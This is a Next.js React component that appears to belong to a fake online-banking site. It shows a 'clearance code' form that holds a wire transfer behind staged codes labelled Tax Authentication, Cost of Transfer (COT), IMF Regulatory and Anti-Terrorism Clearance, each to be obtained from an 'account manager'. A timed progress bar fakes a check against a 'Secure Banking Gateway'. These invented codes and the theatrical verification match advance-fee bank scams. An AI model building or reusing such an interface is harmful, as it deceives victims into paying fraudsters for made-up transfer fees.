'use client';

import { useActionState, useEffect, useState, useRef } from 'react';
import { useRouter } from 'next/navigation';
import { submitClearanceCode } from '@/actions/user/clearance';
import styles from './styles/status.module.css';
import toast from 'react-hot-toast';

const VERIFICATION_DELAY = 10000; // 10 seconds

export default function ClearanceForm({ wire }: { wire: any }) {
    const router = useRouter();
    const [state, action, isPending] = useActionState(submitClearanceCode, undefined);

    const [verifying, setVerifying] = useState(false);
    const [progress, setProgress] = useState(0);
    const [submittedStage, setSubmittedStage] = useState(wire.currentStage);

    const lastProcessedState = useRef<any>(null);
    const toastFiredRef = useRef(false);

    // 1. SERVER RESPONSE
    useEffect(() => {
        if (!state || state === lastProcessedState.current) return;
        lastProcessedState.current = state;

        if (state.message) {
            if (state.success) {
                toastFiredRef.current = false;

                setTimeout(() => {
                    setVerifying(true);
                    setProgress(0);
                }, 0);
            } else {
                toast.error(state.message, { id: 'auth-error' });
            }
        }
    }, [state]);

    // 2. PROGRESS BAR LOGIC
    useEffect(() => {
        if (!verifying) return;

        const intervalTime = 100;
        const steps = VERIFICATION_DELAY / intervalTime;
        const increment = 100 / steps;

        const timer = setInterval(() => {
            setProgress((prev) => {
                const nextVal = prev + increment;
                if (nextVal >= 100) {
                    clearInterval(timer);
                    if (!toastFiredRef.current) {
                        toastFiredRef.current = true;
                        toast.success("Verification Complete", { id: 'auth-success' });
                        setTimeout(() => {
                            setVerifying(false);
                            router.refresh();
                        }, 500);
                    }
                    return 100;
                }
                return nextVal;
            });
        }, intervalTime);

        return () => clearInterval(timer);
    }, [verifying, router]);

    const getStageInfo = (stage: string) => {
        switch (stage) {
            case 'TAA': return { label: 'Tax Authentication Code (TAA)', desc: 'Required by International Tax Authority for large transfers.' };
            case 'COT': return { label: 'Cost of Transfer (COT)', desc: 'Regional banking compliance code required for destination release.' };
            case 'IMF': return { label: 'IMF Regulatory Code (IMF)', desc: 'Final verification step.' };
            case 'IJY': return { label: 'Anti-Terrorism Clearance (IJY)', desc: 'Final IMF Verification required for cross-border settlement.' };
            default: return { label: 'Clearance Code', desc: 'Please enter the code provided by your account manager.' };
        }
    };

    const info = getStageInfo(wire.currentStage);

    // lock stage name before submitting
    const handleSubmit = (formData: FormData) => {
        setSubmittedStage(wire.currentStage);
        action(formData);
    };

    // 3. RENDER: Loading State
    if (verifying) {
        return (
            <div className={styles.loaderBox}>
                <div className={styles.spinner}></div>
                <h3>Verifying {submittedStage} Code...</h3>
                <p>Connecting to Secure Banking Gateway</p>
                <div className={styles.progressBarBg}>
                    <div className={styles.progressBarFill} style={{ width: `${progress}%` }}></div>
                </div>
                <p className={styles.percent}>{Math.round(progress)}%</p>
            </div>
        );
    }

    // 4. RENDER: Form State
    return (
        <div>
            <div className={styles.stageAlert}>
                <h3>Action Required: {wire.currentStage}</h3>
                <p>{info.desc}</p>
            </div>

            <form action={handleSubmit} className={styles.form}>
                <input type="hidden" name="wireId" value={wire.id} />

                <div className={styles.fieldWrapper}>
                    <label className={styles.label}>
                        {info.label}
                    </label>
                    <input
                        name="code"
                        type="text"
                        placeholder={`${wire.currentStage}-XXXX`}
                        className={styles.input}
                        required
                        autoComplete="off"
                    />
                </div>

                <button disabled={isPending} className={styles.button}>
                    {isPending ? 'Validating...' : `Submit ${wire.currentStage} Code`}
                </button>
            </form>

            <p className={styles.help}>
                Please contact support or your account manager to obtain this code.
            </p>
        </div>
    );
}